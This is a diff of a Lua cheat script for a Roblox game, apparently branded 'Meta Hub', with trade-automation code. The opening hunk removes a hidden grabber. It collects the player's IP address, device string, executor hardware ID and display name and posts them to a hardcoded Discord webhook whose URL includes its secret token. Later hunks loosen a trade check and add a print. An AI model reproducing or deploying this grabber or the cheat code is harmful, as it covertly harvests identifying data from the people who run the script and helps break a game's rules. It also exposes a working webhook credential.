@@ -1,39 +1,3 @@
-
-local http_request = request;
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid = decoded.headers["Codex-Fingerprint"]
-local ip = decoded["origin"]
-local device = decoded.headers["User-Agent"]
-
-httpservice = game:GetService("HttpService")
-if hwid then
-	local response = request({
-		Url = "https://discord.com/api/webhooks/1241393145866878996/KBXb8wpgO78mz3TvU_bh5LO32gJuMzKXC1Xjlms-pbLPglurtDtgWKod8SIXdfWTb8Zm",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = 'application/json'
-		},
-		Body = httpservice:JSONEncode({
-			["content"] = "",
-			["embeds"] = {{
-				["title"] = "Data",
-				["description"] = "**Username:** "..game.Players.LocalPlayer.DisplayName.. "\n **Device:** "..device.."\n **HWID:** "..hwid.."\n **IP:** "..ip,
-				["type"] = "rich",
-				["color"] = tonumber(0xd9abd7),
-				["footer"] = {
-					["text"] = "Meta Hub",
-				}
-			}}
-		})
-	})
-end
-
-
-
-
-
 			local UserInputService = game:GetService("UserInputService")
 			local Players = game:GetService("Players")
 			local UIS = game:GetService("UserInputService")
@@ -597,7 +561,7 @@ end
 			end
 
 			function tradeAccept()
-				if getgenv().settings.tradename ~= "" and getgenv().settings.tradeitem ~= "" then
+				if getgenv().settings.tradename  then
 					print(getgenv().settings.tradename, getgenv().settings.tradeitem )
 					local args = {
 						[1] = getgenv().settings.tradename
@@ -618,6 +582,7 @@ end
 						unpack(args)
 						)
 						wait(.1)
+			print("trade: "..getgenv().settings.tradeitem)
 					end
 
 					local args = {
